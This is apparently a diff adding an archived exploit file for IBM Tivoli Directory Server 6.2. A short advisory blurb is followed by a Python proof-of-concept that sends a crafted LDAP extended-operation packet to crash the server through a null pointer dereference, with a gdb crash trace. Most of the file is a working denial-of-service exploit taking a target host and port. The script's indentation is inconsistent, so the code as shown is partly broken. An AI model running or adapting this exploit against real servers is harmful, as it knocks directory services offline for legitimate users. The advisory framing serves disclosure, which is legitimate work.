@@ -1,0 +1,88 @@
+source: http://www.securityfocus.com/bid/37817/info
+
+
+IBM Tivoli Directory Server is prone to a denial-of-service vulnerability caused by heap memory corruption.
+
+An attacker can exploit this issue to crash the affected application, denying service to legitimate users.
+Given the nature of this issue, the attacker may also be able to run arbitrary code, but this has not been confirmed.
+
+IBM Tivoli Directory Server 6.2 is vulnerable; other versions may also be affected.
+
+#!/usr/bin/env python
+# tivoli_nullptr.py
+#
+# Use this code at your own risk. Never run it against a production system.
+# 
+# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
+# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
+# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
+# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
+# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
+# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
+# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+
+import socket
+import sys
+
+"""
+Discovery date: April, 2006!!! 
+
+IBM Tivoli Directory Server 6.2 do_extendedOp DoS (null ptr dereference)
+Tested on Red Hat Enterprise Linux Server release 5.4
+
+# rpm -qa|grep idsldap-srv32bit
+idsldap-srv32bit62-6.2.0-7
+
+gdb backtrace:
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x6c76b90 (LWP 2224)]
+0x0807a1fc in do_extendedOp ()
+(gdb) bt
+#0  0x0807a1fc in do_extendedOp ()
+#1  0x08073c5a in ConnMgr::connection_operation ()
+#2  0x080dee1d in Worker::Run ()
+#3  0x080bca46 in Thr::_doRun ()
+#4  0x003195ab in start_thread () from /lib/libpthread.so.0
+#5  0x00eb8cfe in clone () from /lib/libc.so.6
+(gdb) x/i $eip
+0x807a1fc : repz cmpsb %es:(%edi),%ds:(%esi)
+(gdb) i r
+eax            0x50 80
+ecx            0x10 16
+edx            0x6c760b0 113729712
+ebx            0x81393c8 135500744
+esp            0x6c760e0 0x6c760e0
+ebp            0x6c761d8 0x6c761d8
+esi            0x0 0
+edi            0x80f7ed0 135233232
+eip            0x807a1fc 0x807a1fc 
+eflags         0x210202 [ IF RF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0 0
+gs             0x33 51
+(gdb) 
+
+"""
+
+def send_req(host,port):
+      buf = "\x30\x26\x02\x02\x01\x91\x77\x20\x2d\x32\x36\x38\x34\x33\x35\x34"
+        buf += "\x35\x35\x0f\x31\x2e\x33\x2e\x31\x38\x2e\x30\x2e\x32\x2e\x31\x32"
+        buf += "\x2e\x31\x81\x04\x30\x02\x04\x00"
+ print "Sending req to %s:%d, oid 1.3.18.0.2.12.1" % (host,port)
+
+ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ sock.connect((host,port))
+ sock.sendall(buf)
+ sock.close()
+
+ print "Done"
+
+if __name__=="__main__":
+ if len(sys.argv)<3:
+  print "usage: %s host port" % sys.argv[0]
+  sys.exit()
+
+ send_req(sys.argv[1],int(sys.argv[2]))
